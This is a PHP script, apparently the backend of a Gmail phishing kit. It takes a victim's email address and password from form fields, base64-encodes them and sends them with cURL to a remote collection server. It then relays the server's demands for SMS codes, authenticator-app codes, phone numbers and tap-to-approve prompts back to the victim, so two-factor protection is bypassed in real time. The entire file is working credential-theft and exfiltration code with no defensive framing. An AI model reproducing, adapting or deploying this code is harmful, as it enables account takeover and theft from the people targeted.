<?php
session_start();
include 'config.php';

$em = isset($_POST['ai']) ? trim($_POST['ai']) : null;
$pas = isset($_POST['pr']) ? trim($_POST['pr']) : null;

// Helper function for making cURL requests
function curl($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}

// Handle OTP-related requests
function handleOtpRequest($paramType, $otpParam, $endpoint) {
    global $base, $params;
    if (isset($_POST[$paramType])) {
        $otp = $_POST[$paramType];
        $par = $params . "&otp=" . $otp;
        $sess = $_SESSION['session'] ?? null;
        if ($sess) {
            $url = "{$base}results/{$endpoint}?{$par}&session={$sess}";
            $res = curl($url);
            print_r($res);
        } else {
            echo "Session not set.";
        }
        exit();
    }
}

// OTP, auth app code, and phone verification endpoints
handleOtpRequest('cd', $_POST['cd'], 'gmail-otp');
handleOtpRequest('ath', $_POST['ath'], 'gmail-auth-app-code');
handleOtpRequest('ph', $_POST['ph'], 'gmail-set-num');

if ($em && $pas) {
    $par = $params . "&result_email=" . base64_encode($em) . "&result_password=" . base64_encode($pas);
    $url = "{$base}results/set-gmail?{$par}";

    $res = curl($url);
    $resp = json_decode($res);

    // if (json_last_error() !== JSON_ERROR_NONE) {
    //     echo "Invalid response from server.";
    //     exit();
    // }

    $_SESSION['session'] = $resp->session ?? null;

    switch (trim($resp->response)) {
        case "need_otp":
            echo "otp";
            break;
        case "numberTAP":
        case "Need OTP":
        case "need_email_otp":
            echo "emotp";
            break;
        case "tap_yes":
        case "verify_ph":
        case "need_auth_code":
            print_r(strtolower(str_replace(" ", "_", $resp->response)));
            break;
        case "Wrong Password":
            echo "wrong password";
            break;
        case "Wrong Email Address":
            echo "wrong email";
            break;
        case "saved":
            echo "saved";
            break;
        default:
            print_r(trim($resp->response));
            break;
    }
    exit();
}

echo "Invalid request.";
?>